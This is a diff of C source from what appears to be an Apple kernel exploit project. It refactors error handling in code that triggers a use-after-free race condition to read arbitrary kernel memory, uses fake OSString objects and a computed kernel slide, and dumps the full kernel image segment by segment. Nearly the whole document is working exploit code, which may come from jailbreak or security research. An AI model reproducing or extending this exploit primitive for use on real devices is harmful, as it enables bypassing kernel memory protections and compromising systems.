@@ -5,9 +5,10 @@
 #include <string.h>             // memset, strerror
 #include <unistd.h>             // usleep
 
-#include "common.h"             // ASSERT, DEBUG, ERROR, PRINT_BUF, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
-#include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, dict_get_bytes
+#include "common.h"             // ASSERT, DEBUG, PRINT_BUF, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
+#include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, vtab_t, dict_get_bytes
 #include "slide.h"              // get_kernel_slide
+#include "try.h"                // THROW, TRY, RETHROW
 
 #include "uaf_read.h"
 
@@ -57,17 +58,9 @@ void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
     };
     PRINT_BUF("Dict", dict, sizeof(dict));
 
-/*    uint32_t *buf = malloc(bufsize);
-    if(buf == NULL)
-    {
-        ERROR("Failed to allocate buffer (%s)", strerror(errno));
-    }*/
-
     dict_get_bytes(dict, sizeof(dict), ref, buf, &buflen);
 
     PRINT_BUF("Fetched bytes", (uint32_t*)buf, buflen);
-
-    //free(buf);
 }
 
 void uaf_read(const char *addr, char *buf, size_t len)
@@ -88,15 +81,12 @@ void uaf_read(const char *addr, char *buf, size_t len)
         osstr.length = len - off;
         osstr.length = osstr.length > MIG_MSG_SIZE ? MIG_MSG_SIZE : osstr.length;
         osstr.string = &addr[off];
-        //DEBUG(ADDR " %08x", (addr_t)osstr.string, osstr.length);
-        //fprintf(stderr, "\r" ADDR " %08x", (addr_t)osstr.string, osstr.length);
-        // For some reason we have to slow the process down artificially in order to gain stability.
+        // We have to slow the process down artificially in order to gain stability.
         // I guess this has something to do with the UaF being a race condition.
         usleep(100);
         uaf_get_bytes(&osstr, &buf[off], osstr.length);
     }
     verbose = true;
-    //fprintf(stderr, "\n");
 }
 
 void uaf_dump_kernel(file_t *file)
@@ -107,14 +97,22 @@ void uaf_dump_kernel(file_t *file)
          *newhbuf = malloc(MIG_MSG_SIZE);
     if(hbuf == NULL || newhbuf == NULL)
     {
-        ERROR("Failed to allocate buffer (%s)", strerror(errno));
+        if(hbuf    != NULL) free(hbuf);
+        if(newhbuf != NULL) free(newhbuf);
+        THROW("Failed to allocate buffer (%s)", strerror(errno));
     }
     memset(newhbuf, 0, MIG_MSG_SIZE);
 
     char *kbase = (char*)(0xffffff8004004000 + get_kernel_slide());
-    uaf_read(kbase, hbuf, MIG_MSG_SIZE);
-    //uint32_t *header = (uint32_t*)hbuf;
-    //PRINT_BUF("Kernel header", header, MIG_MSG_SIZE);
+    TRY
+    ({
+        uaf_read(kbase, hbuf, MIG_MSG_SIZE);
+    })
+    RETHROW
+    ({
+        free(hbuf);
+        free(newhbuf);
+    })
 
     mach_hdr_t *hdr = (mach_hdr_t*)hbuf;
     ASSERT(MACH_MAGIC == hdr->magic);
@@ -150,10 +148,11 @@ void uaf_dump_kernel(file_t *file)
     char *buf = malloc(filesize);
     if(buf == NULL)
     {
-        ERROR("Failed to allocate buffer (%s)", strerror(errno));
+        free(hbuf);
+        free(newhbuf);
+        THROW("Failed to allocate buffer (%s)", strerror(errno));
     }
 
-    //verbose = false;
     for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
     {
         switch(cmd->cmd)
@@ -163,7 +162,16 @@ void uaf_dump_kernel(file_t *file)
                 {
                     mach_seg_t *seg = (mach_seg_t*)cmd;
                     DEBUG("Dumping %s...", seg->segname);
-                    uaf_read((char*)seg->vmaddr, &buf[seg->fileoff], seg->filesize);
+                    TRY
+                    ({
+                        uaf_read((char*)seg->vmaddr, &buf[seg->fileoff], seg->filesize);
+                    })
+                    RETHROW
+                    ({
+                        free(hbuf);
+                        free(newhbuf);
+                        free(buf);
+                    })
                 }
             case LC_UUID:
             case LC_UNIXTHREAD:
@@ -178,18 +186,12 @@ void uaf_dump_kernel(file_t *file)
                 break;
         }
     }
-    //verbose = true;
 
     memcpy(buf, newhbuf, sizeof(*hdr) + hdr->sizeofcmds);
 
-    //uaf_read(kbase, buf, len);
     free(hbuf);
     free(newhbuf);
 
     file->buf = buf;
     file->len = filesize;
-    /*return (file_t) {
-        .buf = buf,
-        .len = filesize,
-    };*/
 }
